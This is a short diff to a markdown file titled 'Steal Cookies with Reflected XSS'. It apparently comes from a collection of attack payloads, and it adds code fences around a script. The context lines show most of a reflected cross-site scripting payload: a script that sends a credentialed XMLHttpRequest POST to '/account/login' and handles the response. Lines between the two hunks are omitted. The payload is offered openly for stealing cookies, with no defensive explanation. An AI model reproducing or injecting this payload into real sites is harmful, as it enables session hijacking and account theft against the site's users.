@@ -1,5 +1,6 @@
 # Steal Cookies with Reflected XSS
 
+```
 <script>
 var xhr = new XMLHttpRequest();
 xhr.onreadystatechange = function() { if (xhr.readyState == 4)
@@ -12,6 +13,7 @@ xhr.open('POST', '/account/login',true);
 xhr.withCredentials = true;
 xhr.send(null);
 </script>
+```
 
 ##
 ##
